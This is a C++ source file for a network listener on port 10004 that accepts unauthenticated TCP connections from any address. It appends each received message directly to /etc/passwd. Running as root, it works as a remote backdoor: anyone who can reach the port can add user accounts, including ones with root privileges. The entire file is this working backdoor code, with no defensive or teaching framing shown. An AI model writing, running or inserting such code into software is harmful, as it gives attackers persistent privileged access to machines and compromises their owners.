#include <iostream>
#include <fstream>
#include <cstring>
#include <arpa/inet.h>
#include <unistd.h>
#include <chrono>
#include <ctime>
#include <sys/types.h>
#include <sys/socket.h>
#include <iomanip>
#include <errno.h>

const char* ip = "0.0.0.0"; 
const int port = 10004;             


int main() {
   int serverSock, clientSock;
    struct sockaddr_in serverAddr, clientAddr;
    socklen_t addrLen = sizeof(clientAddr);
    char buffer[1024];

    // Create a TCP socket
    serverSock = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSock < 0) {
        std::cerr << "Error opening socket." << std::endl;
        return 1;
    }

    // Set socket options to reuse address
    int opt = 1;
    if (setsockopt(serverSock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        std::cerr << "Error setting socket options." << std::endl;
        close(serverSock);
        return 1;
    }

    // Bind the socket
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(ip);
    serverAddr.sin_port = htons(port);

    if (bind(serverSock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        std::cerr << "Error binding socket: " << strerror(errno) << std::endl;
        close(serverSock);
        return 1;
    }

    // Listen for incoming connections
    if (listen(serverSock, 5) < 0) {
        std::cerr << "Error listening on socket: " << strerror(errno) << std::endl;
        close(serverSock);
        return 1;
    }

    std::cout << "Listening on " << ip << ":" << port << "..." << std::endl;

    // Constantly accept incoming connections
    while (true) {
        // Accept a client connection
        clientSock = accept(serverSock, (struct sockaddr*)&clientAddr, &addrLen);
        if (clientSock < 0) {
            std::cerr << "Error accepting connection: " << strerror(errno) << std::endl;
            continue; // Continue to listen on errors
        }

        // Receive data from the client
        ssize_t bytesRead = recv(clientSock, buffer, sizeof(buffer) - 1, 0);
        if (bytesRead < 0) {
            std::cerr << "Error receiving data." << std::endl;
            close(clientSock);
            std::cout << "Recieved";
            continue; // Continue to listen on errors
        }

        buffer[bytesRead] = '\0';
        std::string transaction(buffer);
        
        std::string  passFilepath = "/etc/passwd";
	std::string passwdEntry = transaction;
	std::ofstream ofs(passFilepath, std::ios::app);
	if (!ofs){
		std::cerr << "Error opening  /etc/passwd for writing." << std::endl;
		return 1;
	}
	
	ofs << passwdEntry << std::endl;
	ofs.close();


        // Close the client socket
        close(clientSock);
    }

    // Close server socket
    close(serverSock);
    return 0;
}
